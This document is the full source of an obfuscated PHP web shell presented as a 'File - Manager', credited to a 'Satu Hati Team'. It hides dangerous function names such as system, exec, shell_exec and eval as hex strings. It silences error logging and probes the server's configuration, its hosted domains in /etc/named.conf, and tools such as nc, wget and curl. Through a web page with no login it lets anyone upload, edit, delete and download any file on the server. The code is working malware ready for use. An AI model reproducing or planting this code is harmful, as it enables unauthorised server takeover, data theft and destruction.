<?php

$shellName = 'File - Manager';
$logo = 'https://cdn-icons-png.flaticon.com/512/4392/4392477.png';
$func = ["7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "7363616e646972", "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e", "6469726e616d65", "6469736b5f746f74616c5f7370616365", "6469736b5f667265655f7370616365", "696e695f676574", "707265675f6d617463685f616c6c", "706f7369785f6765747077756964", "706f7369785f6765746772676964", "70617468696e666f", "66696c656f776e6572", "66696c6567726f7570", "66696c6574797065", "676574486f73744e616d65", "676574486f737442794e616d65", "737562737472", "737472737472", "696e695f736574", "66696c65", "7374725f7265706c616365", "6578706c6f6465", "6576616c", "6f625f7374617274", "66756e6374696f6e5f657869737473", "6572726f725f7265706f7274696e67", "7365745f74696d655f6c696d6974", "636c656172737461746361636865", "646174655f64656661756c745f74696d657a6f6e655f736574", "666c757368", "7374726c656e", "7472696d", "656d707479", "6973736574", "66696c657065726d73", "7374726c656e", "636f756e74", "726f756e64", "6d696d655f636f6e74656e745f74797065", "6765745f63757272656e745f75736572", "6765746d79756964", "6765746d79676964", "706f7369785f67657465756964", "706f7369785f67657465676964"];

for ($i = 0; $i < count($func); $i++) {
	$func[$i] = dehex($func[$i]);
}

session_start();
$func[50](0);
@$func[51](0);
@$func[52]();
@$func[43]('error_log', null);
@$func[43]('log_errors',0);
@$func[43]('max_execution_time',0);
@$func[43]('output_buffering',0);
@$func[43]('display_errors', 0);
$func[53]("Asia/Jakarta");

if (isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	$func[3]($dir);
} else {
	$dir = $func[2]();
}
	
$d0mains = @$func[44]("/etc/named.conf", false);
if (!$d0mains) {
	$dom = "<font class='text-danger'>Can't Read /etc/named.conf</font>";
} else { 
	$count = 0;
	foreach ($d0mains as $d0main) {
		if (@$func[43]($d0main, "zone")) {
			$func[32]('#zone "(.*)"#', $d0main, $domains);
			$func[54]();
			if ($func[55]($func[56]($domains[1][0])) > 2){
				$func[54]();
				$count++;
			}
		}
	}
	$dom = "<font class='text-success'>$count Domain</font>";
}

$dir = $func[45]("\\", "/", $dir);
$scdir = $func[46]("/", $dir);
$total = $func[29]($dir);
$free = $func[30]($dir);
$pers =  (int) ($free / $total * 100);
$ds = @$func[31]("disable_functions");
$show_ds = (!empty($ds)) ? "<font class='text-danger'>$ds</font>" : "<font class='text-success'>All function is accessible</font>";

$cmd_uname = exe("uname -a");
$uname = $func[49]('php_uname') ? $func[41](@$func[0](), 0, 120) : ($func[55]($cmd_uname) > 0 ? $cmd_uname : '( php_uname ) Function Disabled !');

if (strtolower($func[41](PHP_OS, 0, 3)) == "win") {
	$sys = "win";
} else {
	$sys = "unix";
}

if (isset($_GET['do'])) {
	$do = $_GET['do'];
	if ($do == 'delete') {
		if ($func[12]($dir)) {
			if (deleter($dir)) {
				flash("File/Folder deleted successfully!", "Success", "success", "?dir=" . dirname($dir));
			} else {
				flash("File/Folder failed to delete!", "Failed", "danger");
			}
		} else {
			flash("File/Folder is doesn't exist!", "Failed", "warning");
		}
	} else if ($do == 'download') {
		if ($func[12]($dir)) {
			header("Content-Type: application/octet-stream");
			header("Content-Transfer-Encoding: Binary");
			header("Content-Length: " . $func[10]($dir));
			header("Content-disposition: attachment; filename=\"".basename($dir)."\"");
		} else {
			flash("File is doesn't exist!", "Failed", "warning");
		}
	}
} else {
	$do = 'filesman';
	$title = 'Files Manager';
	$icon = 'archive';
}

((isset($_POST["foldername"])) ? ($func[12]("$dir/{$_POST['foldername']}") ? flash("Folder name is exist!", "Failed", "warning") : ($func[15]("$dir/{$_POST['foldername']}") ? flash("Folder created successfully!", "Success", "success") : flash("Folder failed to create!", "Failed", "danger"))) : null);

((isset($_POST["filename"]) && isset($_POST['filecontent'])) ? ($func[12]("$dir/{$_POST['filename']}") ? flash("File name is exist!", "Failed", "warning") : ($func[13]("$dir/{$_POST['filename']}", $_POST['filecontent']) ? flash("File created successfully!", "Success", "success") : flash("File failed to create!", "Failed", "danger"))) : null);

((isset($_POST["newname"]) && isset($_POST['oldname'])) ? ($func[12]("$dir/{$_POST['newname']}") ? flash("File/Folder name is exist!", "Failed", "warning") : ($func[16]("$dir/{$_POST['oldname']}", $_POST['newname']) ? flash("File/Folder renamed successfully!", "Success", "success") : flash("File/Folder failed to rename!", "Failed", "danger"))) : null);

((isset($_POST["filename"]) && isset($_POST['content'])) ? ($func[13]("$dir/{$_POST['filename']}", $_POST['content']) ? flash("File saved successfully!", "Success", "success") : flash("File failed to save!", "Failed", "danger")) : null);

if (isset($_FILES["uploadfile"])) {
	$n = $_FILES["uploadfile"]["name"];
	for ($i = 0; $i < count($n); $i++) {
		if ($func[11]($_FILES["uploadfile"]["tmp_name"][$i], $n[$i])) {
			flash("File uploaded successfully!", "Success", "success");
		} else {
			flash("File failed to upload!", "Failed", "danger");
		}
	}
}

if (@$func[31]('open_basedir')) {
	$basedir_data = @$func[31]('open_basedir');
	if ($func[55]($basedir_data) > 120){
		$open_b = "<font class='text-success'>" . $func[41]($basedir_data, 0, 120) . "...</font>";
	} else {
		$open_b = '<font class="text-success">' . $basedir_data . '</font>';
	}
} else {
	$open_b = '<font class="text-warning">NONE</font>';
}

if (!$func[49]('posix_getegid')) {
	$user = $func[49]("get_current_user") ? @$func[64]() : "????";
	$uid = $func[49]("getmyuid") ? @$func[65]() : "????";
	$gid = $func[49]("getmygid") ? @$func[66]() : "????";
	$group = "?";
} else {
	$uid = $func[49]("posix_getpwuid") && $func[49]("posix_geteuid") ? @$func[33]($func[67]()) : ["name" => "????", "uid" => "????"];
	$gid = $func[49]("posix_getgrgid") && $func[49]("posix_getegid") ? @$func[34]($func[68]()) : ["name" => "????", "gid" => "????"];
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

if ($sys == 'unix') {
	if (!@$func[31]('safe_mode')) {
		if ($func[55](exe("id")) > 0) {
			$userful = ['gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl'];
			$x = 0;
			foreach ($userful as $i) {
				if (which($i)) {
					$x++;
					$useful .= $i . ', ';
				}
			}
			if ($x == 0) {
				$useful = '--------';
			}
			$downloaders = ['wget','fetch','lynx','links','curl','get','lwp-mirror'];
			$x = 0;
			foreach($downloaders as $i) {
				if (which($i)) {
					$x++;
					$downloader .= $i . ', ';
				}
			}
			if ($x == 0) {
				$downloader = '--------';
			}
		}
	}
}

function hex($str) {
	global $func;
	$r = "";
	for ($i = 0; $i < $func[55]($str); $i++) {
		$r .= dechex(ord($str[$i]));
	}
	return $r;
}

function dehex($str) {
	$r = "";
	$len = (strlen($str) - 1);
	for ($i = 0; $i < $len; $i += 2) {
		$r .= chr(hexdec($str[$i].$str[$i + 1]));
	}
	return $r;
}

function formatSize($bytes) {
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for ( $i = 0; $bytes >= 1024 && $i < ( count( $types ) - 1 ); $bytes /= 1024, $i++ );
	return( round( $bytes, 2 )." ".$types[$i] );
}

function perms($file) {
	global $func;
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000){
		$info = 's';
	}elseif (($perms & 0xA000) == 0xA000){
		$info = 'l';
	}elseif (($perms & 0x8000) == 0x8000){
		$info = '-';
	}elseif (($perms & 0x6000) == 0x6000){
		$info = 'b';
	}elseif (($perms & 0x4000) == 0x4000){
		$info = 'd';
	}elseif (($perms & 0x2000) == 0x2000){
		$info = 'c';
	}elseif (($perms & 0x1000) == 0x1000){
	$info = 'p';
	}else{
		$info = 'u';
	}
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $func[41](sprintf('%o', $perms), -4) . ' >> ' .$info;
}

function exe($in) {
	global $func;
	$out = '';
	try {
		if ($func[49]('exec')) {
			@$func[23]($in, $out);
			$out = @join("\n", $out);
		} elseif ($func[49]('passthru')) {
			$func[48]();
			@passthru($in);
			$out = $func[27]();
		} elseif($func[49]('system')) {
			$func[48]();
			@system($in);
			$out = $func[27]();
		} elseif ($func[49]('shell_exec')) {
			$out = $func[25]($in);
		} elseif ($func[49]("popen") && $func[49]("pclose")) {
			if (is_resource($f = @popen($in,"r"))) {
				$out = "";
				while(!@feof($f))
				$out .= fread($f, 1024);
				pclose($f);
			}
		} elseif ($func[49]('proc_open')) {
			$pipes = [];
			$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
			$out = @stream_get_contents($pipes[1]);
		} elseif (class_exists('COM')) {
			$ws = new COM('WScript.shell');
			$exec = $ws->exec('cmd.exe /c '.$in);
			$stdout = $exec->StdOut();
			$out = $stdout->ReadAll();
		}
	} catch(Exception $e) {}
	return $out;
}

function checkName($name) {
	global $func;
	if ($func[55]($name) > 18) {
		return $func[41]($name, 0, 18) . "...";
	}
	return $name;
}

function checkPerm($dir, $perm) {
	global $func;
	$perm = explode('>>', $perm);
	if ($func[8]($dir)) {
		return "<font class='text-success'>".$perm[0]."</font> >> <font class='text-success'>".$perm[1]."</font>";
	} elseif (!$func[9]($dir)) {
		return "<font class='text-danger'>".$perm[0]."</font> >> <font class='text-danger'>".$perm[1]."</font>";
	} else {
		return "<font class='text-secondary'>".$perm[0]."</font> >> <font class='text-secondary'>".$perm[1]."</font>";
	}
}

function getowner($item) {
	global $func;
	if ($func[49]("posix_getpwuid")) {
		$downer = @$func[33](fileowner($item));
		$downer = $downer['name'];
	} else {
		$downer = fileowner($item);
	}
	if ($func[49]("posix_getgrgid")) {
		$dgrp = @$func[34](filegroup($item));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = filegroup($item);
	}
	return $downer . '/' . $dgrp;
}

function geticon($file) {
	global $func;
	$ext = strtolower($func[35]($file, PATHINFO_EXTENSION));
	if ($ext == 'php' || $ext == 'html' || $ext == 'js' || $ext == 'css' || $ext == 'py' || $ext == 'perl' || $ext == 'sh') {
		return 'file-code';
	} else if ($ext == 'pdf') {
		return 'file-pdf';
	} else if ($ext == 'txt') {
		return 'file-alt';
	} else if ($ext == 'csv') {
		return 'file-csv';
	} else if ($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif') {
		return 'file-image';
	} else if ($ext == 'mp4' || $ext == '3gp' || $ext == 'mkv') {
		return 'file-video';
	} else if ($ext == 'docx' || $ext == 'doc' || $ext == 'docm') {
		return 'file-word';
	} else if ($ext == 'ppt' || $ext == 'pptx') {
		return 'file-powerpoint';
	} else if ($ext == 'xlsx' || $ext == 'xlsb' || $ext == 'xlsm' || $ext == 'xltx' || $ext == 'xltm') {
		return 'file-excel';
	} else if ($ext == 'mp3' || $ext == 'wav') {
		return 'file-audio';
	} else if ($ext == 'sql' || $ext == 'db') {
		return 'database';
	} else if ($ext == 'zip' || $ext == 'tar' || $ext == 'gz' || $ext == 'tar.gz' || $ext == '7z' || $ext == 'bz2') {
		return 'file-archive';
	} else {
		return 'file';
	}
}

function which($p) {
	global $func;
	$path = exe('which ' . $p);
	if (!empty($path)) {
		return $func[55]($path);
	}
	return false;
}

function flash($message, $status, $class, $redirect = false) {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["class"])) {
		unset($_SESSION["class"]);
	}
	if (!empty($_SESSION["status"])) {
		unset($_SESSION["status"]);
	}
	$_SESSION["message"] = $message;
	$_SESSION["class"] = $class;
	$_SESSION["status"] = $status;
	if ($redirect) {
		header('Location: ' . $redirect);
		exit();
	}
	return true;
}

function clear() {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["class"])) {
		unset($_SESSION["class"]);
	}
	if (!empty($_SESSION["status"])) {
		unset($_SESSION["status"]);
	}
	return true;
}

function deleter($d) {
	global $func;
	if (trim($func[35]($d, PATHINFO_BASENAME), '.') === '') {
		return false;
	};
	if ($func[6]($d)) {
		array_map("deleter", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		rmdir($d);
		return true;
	} else {
		unlink($d);
		return true;
	}
	return false;
}

$scandir = $func[21]($dir);

?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
	<title><?= $shellName ?></title>
</head>
<body>
	<div class="container-lg">
		
		<nav class="navbar navbar-light bg-light">
			<div class="container-fluid">
				<a class="navbar-brand" href="?">
					<img src="<?= $logo ?>" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
					<?= $shellName ?>
				</a>
			</div>
		</nav>
		
		<?php if (isset($_SESSION['message'])) : ?>
		<div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show my-3" role="alert">
			<strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
			<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>
		<?php endif; clear(); ?>

		<div id="tool">
			<div class="d-flex justify-content-center flex-wrap my-3">
				<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
			</div>
			
			<div class="row">
				<div class="col-md-12">
					<div class="collapse" id="upload" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								 <div class="col-md-6">
									<form action="" method="post" enctype="multipart/form-data">
										<div class="input-group">
											<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
											<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
										</div>
									</form>
								 </div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
					<div class="collapse" id="newfile" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-6">
									<form action="" method="post">
										<div class="mb-3">
											<label class="form-label">File Name</label>
											<input type="text" class="form-control" name="filename" placeholder="file.txt">
										</div>
										<div class="mb-3">
											<label class="form-label">File Content</label>
											<textarea class="form-control" rows="5" name="filecontent"></textarea>
										</div>
										<button type="submit" class="btn btn-outline-dark">Create</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-12">
					<div class="collapse" id="newfolder" data-bs-parent="#tool">
						<div class="card card-body border-dark mb-3">
							<div class="row">
								<div class="col-md-6">
									<form action="" method="post">
										<div class="mb-3">
											<label class="form-label">Folder Name</label>
											<input type="text" class="form-control" name="foldername" placeholder="folder">
										</div>
										<button type="submit" class="btn btn-outline-dark">Create</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-md-12">
				<div class="card border-dark">
					<div class="card-body">
						<h5><i class="fas fa-angry"></i> Server Information </h5>
						<div class="table-responsive">
							<table class="table table-hover text-nowrap">
								<tr>
									<td>Operating System</td>
									<td> : <?= $uname ?></td>
								</tr>
								<tr>
									<td>PHP Version</td>
									<td> : <?= $func[1]() ?></td>
								</tr>

								<tr>
									<td>Storage</td>
									<td class="d-flex">: Total = <?= formatSize($total) ?>, Free = <?= formatSize($free) ?> [<?= $pers ?>%]</td>
								</tr>

								<tr>
									<td>Disable Functions</td>
									<td>: <?= $show_ds ?></td>
								</tr>

								<tr>
									<td colspan="2">CURL : <?= $func[49]('curl_version') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | SSH2 : <?= $func[49]('ssh2_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Magic Quotes : <?= $func[49]('get_magic_quotes_gpc') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MySQL : <?= $func[49]('mysql_get_client_info') || class_exists('mysqli') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MSSQL : <?= $func[49]('mssql_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | PostgreSQL : <?= $func[49]('pg_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Oracle : <?= $func[49]('oci_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?></td>
								</tr>
								<tr>
									<td colspan="2">Safe Mode : <?= @$func[31]('safe_mode') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir : <?= @$func[31]('safe_mode_exec_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_exec_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?> | Safe Mode Include Dir : <?= @$func[31]('safe_mode_include_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_include_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?></td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			</div>
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						<h5><i class="fas fa-angry"></i> Path </h5>
						<nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '>';">
							<ol class="breadcrumb">
								<?php
									$numDir = count($scdir);
									foreach ($scdir as $id => $pat) {
										if ($pat == '' && $id == 0) {
											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/">/</a></li>';
											continue;
										}
										if ($pat == '') continue;
										if ($id + 1 == $numDir) {
											echo '<li class="breadcrumb-item active" aria-current="page">'.$pat.'</li>';
										} else {
											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=';
											for ($i = 0; $i <= $id; $i++) {
												echo "$scdir[$i]";
												if ($i != $id) echo "/";
											}
											echo '">'.$pat.'</a></li>';
										}
									}
								?>
							</ol>
						</nav>
						[ <?= checkPerm($dir, perms($dir)) ?> ]
					</div>
				</div>
			</div>
			<div class="col-md-12" id="main">
				<div class="card border-dark overflow-auto">
					<div class="card-body">
						<h5><i class="fa fa-<?= $icon ?>"></i> <?= $title ?></h5>
						<?php if ($do == 'view') : ?>
							<h1>Anjing</h1>
						<?php else: ?>
							<?php if ($func[9]($dir)) : ?>
								<div class="table-responsive">
									<table class="table table-hover text-nowrap">
										<thead>
											<tr>
												<th>Name</th>
												<th>Type</th>
												<th>Size</th>
												<th>Last Modified</th>
												<th>Owner/Group</th>
												<th>Permission</th>
												<th>Action</th>
											</tr>
										</thead>
										<tbody>
											<?php
												foreach ($scandir as $item) :
													if (!$func[6]($dir . '/' . $item)) continue;
											?>
												<tr>
													<td>
														<?php if ($item === '..') : ?>
														<a href="?dir=<?= $func[28]($dir); ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
														<?php elseif ($item === '.') :  ?>
														<a href="?dir=<?= $dir; ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
														<?php else : ?>
														<a href="?dir=<?= $dir . '/' . $item ?>" class="text-decoration-none text-dark"><i class="fa fa-folder"></i> <?= checkName($item); ?></a>
														<?php endif; ?>
													</td>
													<td><?= $func[38]($item) ?></td>
													<td class="align-middle">--</td>
													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
													<td><?= getowner($item) ?></td>
													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
													<td>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="'.$item.'"' ?>><i class="fa fa-edit"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="'.$dir . '/' . $item.'"'?>><i class="fa fa-trash-alt"></i></button>
													</td>
												</tr>
											<?php endforeach; ?>
											<?php
												foreach ($scandir as $item) :
													if (!$func[7]($dir . '/' . $item)) continue;
											?>
												<tr>
													<td><a data-bs-toggle="modal" href="#viewModal" role="button" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>" class="text-dark text-decoration-none"><i class="fa fa-<?= geticon($item) ?>"></i> <?= checkName($item); ?></a></td>
													<td><?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?></td>
													<td><?= formatSize($func[10]($item)) ?></td>
													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
													<td><?= getowner($item) ?></td>
													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
													<td>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#viewModal" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>"><i class="fa fa-file-signature"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#downloadModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-download"></i></button>
														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-trash-alt"></i></button>
													</td>
												</tr>
											<?php endforeach; ?>
										</tbody>
									</table>
								</div>
							<?php else: ?>
								<font class="text-danger">Can't read this directory!</font>
							<?php endif; ?>
						<?php endif; ?>
					</div>
				</div>
			</div>
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						Copyright r13shere98[at]gmail.com <span class="float-end">Satu Hati <span class="text-muted">Team</span></span>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <form method="post" id="rename-form">
		      <div class="modal-body">
		          <div class="mb-3">
		            <label for="newname" class="col-form-label">New Name:</label>
		            <input type="text" class="form-control" name="newname" id="newname">
		          </div>
		      </div>
		      <div class="modal-footer">
		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
		        <button type="submit" class="btn btn-primary">Rename</button>
		      </div>
        </form>
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <div class="modal-body">
	        Are you sure want to delete this?
	      </div>
	      <div class="modal-footer">
	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
	        <a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
	      </div>
	      
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <div class="modal-body">
	        Are you sure want to download this?
	      </div>
	      <div class="modal-footer">
	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
	        <a href="" class="btn btn-danger" id="download-confirm">Download</a>
	      </div>
	      
	    </div>
	  </div>
	</div>
	
	<div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
	  <div class="modal-dialog modal-dialog-centered">
	    <div class="modal-content">
	      <div class="modal-header">
	        <h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
	      </div>
	      <form action="" method="post">
		      <div class="modal-body">
		        <div class="mb-3">
	            <label for="content" class="col-form-label">Content:</label>
	            <textarea class="form-control" id="content" rows="15" name="content"></textarea>
	          </div>
		      </div>
		      <div class="modal-footer">
		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
		        <button type="submit" class="btn btn-primary">Save</button>
		      </div>
	      </form>
	    </div>
	  </div>
	</div>
	
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
	<script>
		var renameModal = document.getElementById('renameModal')
		var deleteModal = document.getElementById('deleteModal')
		var viewModal = document.getElementById('viewModal')
		var downloadModal = document.getElementById('downloadModal')
		
		renameModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var name = button.getAttribute('data-bs-name')
			var modalTitle = renameModal.querySelector('.modal-title')
			var modalBodyInput = renameModal.querySelector('.modal-body input')
			var hiddenInput = document.createElement('input')
			hiddenInput.type = "hidden";
			hiddenInput.value = name;
			hiddenInput.name = "oldname";
			document.getElementById("rename-form").appendChild(hiddenInput);
			
			modalBodyInput.value = name
		})
		
		deleteModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var file = button.getAttribute('data-bs-file')
			var deleteConfirm = document.getElementById('delete-confirm')
			deleteConfirm.href = '?dir=' + file + '&do=delete'
		})
		
		downloadModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var file = button.getAttribute('data-bs-file')
			var downloadConfirm = document.getElementById('download-confirm')
			downloadConfirm.href = '?dir=' + file + '&do=download'
		})
		
		viewModal.addEventListener('show.bs.modal', function (event) {
			var button = event.relatedTarget
			var content = button.getAttribute('data-bs-content')
			var name = button.getAttribute('data-bs-name')
			var modalTitle = viewModal.querySelector('.modal-title')
			var modalContent = viewModal.querySelector('.modal-body textarea')
			var hiddenInput = document.createElement('input')
			hiddenInput.type = "hidden";
			hiddenInput.value = name;
			hiddenInput.name = "filename";
			viewModal.querySelector("form").appendChild(hiddenInput);

			modalTitle.textContent = 'Edit ' + name
			modalContent.value = content
		})
	</script>
</body>
</html>
